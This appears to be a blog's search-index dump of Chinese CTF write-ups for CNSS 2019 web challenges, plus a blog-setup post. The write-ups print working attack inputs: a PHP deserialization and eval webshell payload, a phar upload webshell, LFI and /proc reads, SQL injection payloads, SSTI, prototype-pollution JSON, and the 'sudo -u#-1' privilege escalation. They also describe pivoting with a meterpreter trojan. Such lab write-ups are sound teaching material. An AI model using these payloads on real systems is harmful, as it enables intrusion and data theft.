","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:1:0","tags":["CNSS"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["WriteUp"],"content":"0x01 反序列化漏洞 打开这道题首先就是一堆 PHP 源码，直接就摆上了一大堆 class ，先暂时略过这些 class ，继续向下看，我们会发现在源码的末尾有这么一段 \u003c?php $a = $_GET['p']; unserialize($a); if($flag === 1){ ... } ?\u003e 结合上边的一大堆 class ，考虑利用反序列化漏洞，层层递进，最终将变量 flag 的值设为 1 即可，故构造以下 payload （这里可以直接复制粘贴，然后自己写一个脚本把需要的变量序列化一下即可） /?p=O:4:\"Deep\":2:{s:2:\"m1\";O:4:\"Dark\":2:{s:2:\"m1\";O:7:\"Fantasy\":2:{s:2:\"m1\";O:5:\"Happy\":2:{s:2:\"m1\";O:8:\"New_year\":2:{s:2:\"s1\";O:21:\"Copied_from_somewhere\":0:{}s:2:\"s2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;} 输入后发现在未提供参数 c 的情况下输出了 ? ，可知成功将 flag 设为 1 ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:2:0","tags":["CNSS"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["WriteUp"],"content":"0x02 get shell 之后查看最后的一段源码 \u003c?php if(!isset($_GET['c'])){ die(\"?\"); } $code = $_GET['c']; if(strlen($code)\u003e37){ die(\"这么长会死的!\"); } if(preg_match(\"/[A-Za-z0-9^!]+/\",$code)){ die(\"Catch you!\"); } @eval($code); ?\u003e 考虑通过 eval 这个函数调用其他函数拿到系统 shell ，然而首先要面对的问题就是这个可恶的正则，你注入的代码中不能包含任何字母、数字和 ^ ! 两种符号 这里可以使用 PHP 的另一种函数调用方式 (函数名)(参数) ，然后函数名和参数都采用按位取反的方式，通过url编码和 ~ 运算符调用函数 然后我们非常高兴的执行了 system('whoami') ，但是，什么都没有发生，看一下 phpinfo() ，发现几乎所有能拿到系统shell的函数都在 disable_functions 里，然后考虑绕过 disable_functions 的方法，经过多方查找，最后选择了通过 LD_PRELOAD 的方式绕过，但这种方法需要上传文件，所以继续构造 payload /?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}\u0026c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);\u0026%aa=eval($_POST['aaa']); 这里我们采用另一个可以执行 PHP 语句的函数 assert ，但由于 assert 一次只能执行一条语句，我们可以在其中再加入一个 eval ，这里便出现了我们熟悉的一句话木马，二话不说扔到蚁剑里，发现 shell 依然无法使用，但可以读取和上传文件（这里是因为读取和上传文件可以用 PHP 自带的其它函数实现，所以不需要拿到 shell 就可以），由于 hint 告诉我们对 html 目录没有写权限，故考虑另一个目录 /tmp ，测试后发现有写权限，故可以上传构造的 so 文件进行进一步操作（但当时服务器里有不知哪位好心的大哥留下的 so 文件，我就直接拿来用了，后来知道那个文件出自此处，这个构造的十分巧妙，使用了另一个环境变量，配合 PHP 实现一次编译即可执行任意命令，无需每次修改命令都要重新编译，学到了)，然后 include 一下配套的 PHP 文件，按照 PHP 里的参数配置一下，成功拿到系统shell ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:3:0","tags":["CNSS"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["WriteUp"],"content":"0x03 内网穿透 由于 hint 给出了 LAN \u0026 ARP ，这里考虑 flag 可能存在于另一台服务器（记为服务器2）上，用 arp -a 看一下，发现有这么一个 IP 与众不同 getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0 curl 看一下，发现有一个网页可以上传文件，考虑将服务器2的80端口转发出来，可以采用 msf 的 meterpreter 模块（这里需要自己有一个公网 IP ，我选择开了一个 VPS ，一般来说再将 VPS 端口转发到本地比较安全，但我为了方便直接在 VPS 上装了个 msf ，毕竟用完即删） 先用 msfvenom 做个木马，然后用蚁剑上传到服务器1，给一下执行权限，接下来在 msfconsole 中监听木马设置的端口，然后再服务器1中运行木马，拿到 meterpreter shell，然后用 portfwd 进行端口转发，打开转发到服务器上的端口，成功打开服务器2上的网页 ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:4:0","tags":["CNSS"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["WriteUp"],"content":"0x04 get shell Again 打开页面，发现似乎可以上传什么东西，观察 url 有 /?file=index ，点击上传后 url 变化但页面并未变化，尝试去掉最后的 .php ，发现成功打开上传页面，可以判断 file 是一个 include 漏洞，尝试 php伪协议 读取源码，构造以下 payload /?file=php://filter/read=convert.base64-encode/resource=upload 成功读到 upload.php 的源码（我第一次做的时候的确读到了源码，但再次尝试却发现读不到了QAQ） 观察上传页面，发现并无表单可以提交，就在本地写一个表单提交到服务器2，尝试发现只能上传 png 文件，由于 hint 指出了 Phar ，于是写一个一句话木马，打包成 zip（注意打包时选择不压缩），然后将拓展名改为 png ，成功上传，得到上传后的文件名，构造以下 payload（注意最后的木马名不需要 .php) /?file=phar://pic/文件名/木马名 看一下 phpinfo ，发现拿 shell 的函数并没有被禁用，直接拿到系统shell（这里我想再扔到蚁剑里，但莫名其妙连不上，就手动操作了） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:5:0","tags":["CNSS"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["WriteUp"],"content":"0x05 读取 flag 文件 根据 hint ，只有 root 用户可以读取 flag 文件，尝试 sudo cat，发现并不能读取，sudo -l 看一下权限，发现权限设置如下 (ALL,!root) NOPASSWD:/bin/cat 直接使用 sudo 无法使用 cat ，这里我探索了接近两小时终于搜到了一个神奇的漏洞 CVE-2019-14287 ，漏洞具体信息可以参考我好不容易搜到的的这个网站 根据这个漏洞执行以下命令 sudo -u#-1 /bin/cat /flag 成功获得 flag！！！（泪目） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:6:0","tags":["CNSS"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["WriteUp"],"content":" 由于技术有限，时间匆忙，本文可能存在各种问题。如发现问题（如思路错误、术语错误 或 我的解法凭空增加了解题难度 等），请各位 dalao 毫不犹豫的锤爆我的狗头，谢谢！ 感谢 ay3 对 产品经理 一题解题思路的指正，感谢 dalao！ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:0:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"check_in web 的第一道签到题，打开就说了 hide，果断 F12 看源码，发现注释里有些东西 \u003c!--what is this : ./secret/f1ag_is_h4re.php--\u003e 直接在url后添加 /secret/f1ag_is_h4re.php 进入下一关，这里再看源码并无收获，看一下 Cookie，发现多了一条名为 interesting_string 的 Cookie，查看其内容如下 Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9 猜测为某种编码，尝试 base64 解码，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:1:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"True_check_in 真正的签到题？打开发现是一个数学题，果断打开计算器算出正确答案 8589934592 输入答案时发现问题，输入框有长度限制，看源码，发现最大长度为 8，而我们的答案有十位，但这里长度限制在前端，打开 Burp Suite 一通抓包改包（也可审查元素直接改maxlength），输入正确答案，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:2:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"warm_up 来热个身！看到题目即想到修改 header，这里用到了 User-Agent 、 X-Forwarded-For 和 Referer 首先在 User-Agent 中添加 cnss，或直接将其中浏览器名称改为 cnss PS：这里应注意，不要将 UA 内容全部删除只写入 cnss，这样有可能服务器无法解析而拿不到 flag 然后添加下面两句 X-Forwarded-For: 233.233.233.233 Referer: www.notcnss.com 将包发出，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:3:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"GAY' Profile 一眼望去，好GAY的题首先看源码，发现如下注释 \u003c!-- Why not try to get /source ? --\u003e 果断 url 后加 /source，拿到源码，发现在 /file 中通过name参数可以读取文件，结合 hint 中所说 flag 在 /flag 中构造 url /file?name=../flag 别问我为什么 flag 在上一级目录，试一试就出来了（逃，成功获取 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:4:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"love_reading 拿到这道题，只给了两句话，乍一看比较懵 Evil robot take my love. I only know that he uses linux. 细细分析这两句话中的提示，发现 robot 和 linux 应该有作用 先尝试在 url 后添加 /robots.txt， 出现了 s4cret.php，直接修改 url，惊喜的发现一片空白 读 hint 发现 vim in linux ，眼前一亮，即想到 vim 产生的临时文件 分别尝试 /.s4cret.php.swp 和 /.index.php.swp，发现 index.php 存在临时文件，用 vim 还原，得到源码 if(!(isset($_GET['key']) \u0026\u0026 isset($_GET['f']))){ die(); } else{ $path = $_GET['key']; $data = file_get_contents($path); if($data != \"zhi ma kai men!\"){ die(\"no no nope\"); } $f = $_GET['f']; include($f); } 源码不长，发现有两个参数 key 和 f，分别调用 file_get_contents() 和 include()，应从这两个地方入手，由于没有任何过滤机制，故直接考虑 PHP 伪协议 第一个参数应用自己的输入代替获取文件内容，可用 php://input 加 POST 传参直接绕过 第二个参数应为 include() 的任意文件读取，用 php://filter 即可 故构造以下url /?key=php://input\u0026f=php://filter/convert.base64-encode/resource=s4cret.php 然后 Burp Suite 抓包，请求方法改为 POST，请求体添加 zhi ma kai men!，获得一段 base64 编码的文本（或直接采用 HackBar 发送 POST 请求），解码后可看到一段神奇的注释，成功获得flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:5:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"Gay Profile Plus 继续 gay看源码，继续 /source，发现加了一段神奇的语句 if os.path.abspath(filename).startswith(os.getcwd()) and filename != './profile': return 'No No No', 422 这里大概意思是，如果要读取的文件在当前工作目录，那么它必须是 ./profile，但是题目告诉我们 flag 在 ./flag 中，显然直接读取就行不通了，由抓包可知服务器为 Linux，可考虑 /proc 文件系统 proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。（源自网络） 一般来说 /proc 目录下有以 PID 命名的目录，可以通过此目录获取进程所在目录的文件，但这里显然无法获取 PID，但源码中 os.getcwd() 提醒我们要用当前工作目录，于是构造以下 url /file?name=/proc/self/cwd/flag 成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:6:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"baby_sql 作为 sqli 的第一题，本题并不难，未进行任何过滤，但添加了 code 参数进行验证，防止了直接 SqlMap，但只需进行简单 union 查询注入即可，但应注意，此处仅显示查询的第一条结果，故查询时应给予一个无内容的 id 依次查询库名、表名、字段名，直接查询即可，成功获得 flag PS：可采用 Python 脚本自动输入 code 参数，缩短操作时间（另三道 sqli 同理） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:7:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"蟒蛇-Login_in 打开发现一个登录界面，需要提供密码和验证码，且知道验证码MD5后的前三位，看源码，有以下注释 \u003c!--验证码一共4位数字字母，密码都是数字，验证码正确你就知道密码位数了--\u003e 那就先写一个计算验证码的 python 脚本 得到正确的验证码并输入后，得知密码为4位数字，由于没有任何其他提示，这里选择爆破法，只需从 0000 试到 9999 即可，将上面的脚本进行扩充（由于验证码随机，注意使用 session，且注意 requests 获取网页的编码格式） 输入获取到的正确密码和验证码，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:8:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"Gay Profile Plus Plus 既然题干已经说了放在文件不安全，那就不可能直接从本地文件获取 flag 了，那如何把一个东西存储在文件之外呢？这里我们继续考虑 gay+ 的时候用过的 /proc 文件系统，因为它存在于内存中，当然就不是文件了 查看 /proc 文件系统的具体说明，发现在进程目录下存在一个环境变量，猜测 flag 可能存在于此，故构造 url 如下 /file?name=/proc/self/environ 发现 flag 果然在此，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:9:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"产品经理 查看源码，在 db.php 的注释中发现以下 sql 语句 ...namechar(64)...INSERTINTOproductsVALUES('cnss',sha256(....),'FLAG_HERE');... 得知 name 的长度最大为 64 ， 而我们需要获取 name 为 cnss 处的 description 因题干说了使用了 PDO ，首先排除sql注入 观察源码，发现 get_product 和 check_name_secret 分离 function get_product($name) { global $db; $statement = $db-\u003eprepare( \"SELECT name, description FROM products WHERE name = ?\" ); ...} function check_name_secret($name, $secret) { global $db; $valid = false; $statement = $db-\u003eprepare( \"SELECT name FROM products WHERE name = ? AND secret = ?\" ); ...} 即验证 name 和 secret 和获取信息并非同步进行，而获取信息时并不需要 secret，考虑到 Mysql 对尾空格的处理，add 以下内容 Name: cnss + 任意空格 Secret: 符合要求即可 Description: 任意 执行 add 操作后，view 以下内容 Name: cnss Secret: 上一步设置的密码 执行 view 操作，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:10:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"easy_sql 经过试验，发现许多字符被屏蔽，比较重要的有（都有方法绕过或不使用） and - * 空格 其中 空格 可用 %0a 代替，注释符号 -- 可用 %23 代替 由于 and 不可用，这里考虑报错注入，且由于 * 不可用，考虑 xml 的报错，经测试，xml 的报错注入可用，故构造如下 payload 1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23 只需将 ...... 处修改为查询语句，即可在报错中看到查询结果 依次查询库名、表名、字段名，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:11:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"True_Love 不得不说，出题人真的有心了 但是先别看这个心了看题吧 从第一个界面目测找不到什么有用信息，不妨打开题目所说的 /admin ，看到一个登陆界面，且第一行就说 只有admin才能拿到flag 那就让我们成为 admin 不就好了 查看 cookie 发现一条 session ， base64解码，发现第一段为用户名，考虑 session 伪造，而现在的问题在于不知道密钥，那就先拿到密钥 随便修改 / 后的内容，发现 404 界面中有出错的 url ，由于后端为 python ，尝试模板注入，先构造 {{1+1}} 得到结果 2 ，模板构造漏洞存在，直接构造 {{config}} ，即可得到密钥 通过 flask 框架构造 session ，替换本题网页中的 session，刷新页面即可发现 flag 出现在 url 中，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:12:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"normal_sql 本题验证码变成了给定其md5的前四位，无非是增加了些脚本行数和运行时间，问题不大 依旧过滤了众多字符，且并无错误信息，故考虑延时盲注，构造如下 payload 1'and(if(ascii(substr((select(...)from(...)),index,1))\u003e0,1,sleep(3)))%23 修改 ... index 和 0 处的值，通过网页加载时间，判断盲注结果 依次查询库名、表名、字段名，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:13:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"Gay Profile Plus Plus Plus emmm…ts后端可还行 源码提供了那就直接康康，发现在 /file 中有以下内容 if (!file \u0026\u0026 !ctx.__proto__.name) { ctx.body = 'No No No...'; ctx.status = 422; return; } else if (file \u0026\u0026 file.indexOf('flag') !== -1){ ctx.body = 'No No No...'; ctx.status = 403; return; } else if (!file){ file = ctx.__proto__.name; } 大概一看我们就会发现，flag 应该是放在一个文件中，而你不能通过这个文件名读取它，但是可以通过 ctx.__proto__.name 继承 name 属性，所以考虑原型链污染 再看 /save 的部分，可以发现输入数据会通过 JSON.parse 解析，这样就为我们进行原型链污染提供了可能，故构造以下 JSON字符串 {\"type\": \"hhh\", \"content\": {\"constructor\": {\"prototype\": {\"name\": filename}}}} 只需修改 filename 的值提交，再在 /file 处将 name 留空，即可读取任意文件，首先尝试 flag 无果，再尝试 ../flag ，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:14:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"hard_sql 题干直接告诉我们 Make it wrong ，首先考虑的是报错注入，但是错误信息根本没有回显，出错只会有 Something wrong 的提示 这里可以考虑让其在特定情况下报错，首先考虑 if ，发现被过滤，于是使用 case when 的用法 构造以下 payload 1' and case (ascii(substr((something),index,1))) when asc then pow(999,999) end %23 这里注意 select 和 information 会被过滤，但只需通过大小写变化绕过即可 上述语句在查询的字符的 ascii 等于给出的数字时，才会执行 pow(999,999) ，此时才会产生报错 通过修改 something index 和 asc 可以爆出库名和表名，但当尝试爆出字段名的时候发现 column 被过滤且无法绕过，所以尝试无列名注入（虽然我也不懂为什么无列名注入的题只有一列，但是还是这么做了）,将 something 改为如下 payload 即可进行无列名注入 Select`1`from(Select1unionselect*fromdatabase_name.table_name)asalimit1,1 依次爆出 flag 的每一位即可，成功获得 flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:15:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["WriteUp"],"content":"[BOSS] Get Me Inside Get ♂ Me ♂ Inside ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:16:0","tags":["CNSS","Web 安全"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["心路历程"],"content":"0x00 前言 前几天心血来潮想搭个博客，可万万没想到，搭个博客如此令人愉(beng)悦(kui)，来让我们从头说起😭 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:1:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x01 Where？ 搭建博客一般有两种选择：GitHub Page 或者 自己的服务器(VPS)。第一种方法操作简单，而且不要钱，但只能使用静态网站，可以搭配 Hexo 等静态网站生成器，但是由于一些特殊的原因，这里我采用了第二种方法 Github Page 真香（用了 Custom domain）。 VPS 服务商我选择了老牌大厂 Vultr ，一个一个试 IP 可是真的快♂乐（手动滑稽），经过无数次尝试，苍天不负有心人，终于给我个能用的了，然后 LNMP 一条龙，服务器方面基本 OK。 然后是域名，依旧是个老牌大厂 GoDaddy ，搞完域名随手挂在 CloudFlare 上，爽歪歪。 至此，第一个问题 “Where?” 解决。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:2:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x02 How？ 说起怎么建站，这可真的是血泪史的来历。 搭建博客一般又有两种选择：动态网站 和 静态网站。当然又由于对技术的向往（这次是真的向往），反手就是一个 Wordpress （安装极其容易，轻松开始 Blog 生活）。 好了装是装完了，嫌配置麻烦可能是因为我太菜了，但是，你官方主题还能再丑一点吗，你说好的博客平台你为啥主题千奇百怪（此处省略一万字吐槽），由于本人过菜不想自己配置太多只能靠吐槽为生，大佬勿喷反正也不会有大佬看的吧。好吧那既然官方主题满♂足不了我我就找第三方呗，但是，好康的是有啊，但是都要钱啊（此处留下贫穷的泪水）。好吧，潇洒转身，缓缓打出 rm -rf ./* ，拜拜了您嘞。 于是转向静态网站寻求解决，嗯，真香。说到静态网站就要提到这三家：Jekyll, Hugo 和 Hexo。这里我选择了配置简单，但并未改变我对技术的向往（手动狗头），且生成速度快的 Hugo （最终由于不明原因变成了 Hexo）。 配置方面嘛，打开 GitHub ，搜索 Hugo ，下载对应系统的 Release 版本，配置完成。这里不得不点名表扬一下 Hugo 的官方文档，真的是应有尽有了，然后再点名表扬一下官方收录的主题，跟隔壁算了面向的群体不同不说了。在我究极审美的指引下，我选择了这款偏向极简风格的 Coder 主题，自己看着舒服就好了。 从 GitHub 上 clone 一下主题，简单配置一下，就可以投入使用了。 cnpm install hexo-cli -g 至此，第二个问题 “How?” 也解决了。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:3:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x03 使用 HTTPS 这里我使用了一个极其草率的方法，直接使用了 CloudFlare 的 Flexible 模式，然后再 Page Rule 里配置一下强制使用 HTTPS 即可。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:4:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x04 总结 搭建博客并非一个简单的事，而同一种方法也不一定适合所有人，只有经过自己的尝试发现真正适合自己的方法，才能搭建出真正属于自己的博客。 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:5:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"},{"categories":["心路历程"],"content":"0x05 2020.5.31 更新 又由于一些不明原因，重新用回了 Hugo，感觉良好 ","date":"2019-10-23","objectID":"/posts/build-my-blog/:6:0","tags":["Blog"],"title":"博客搭建血泪史","uri":"/posts/build-my-blog/"}]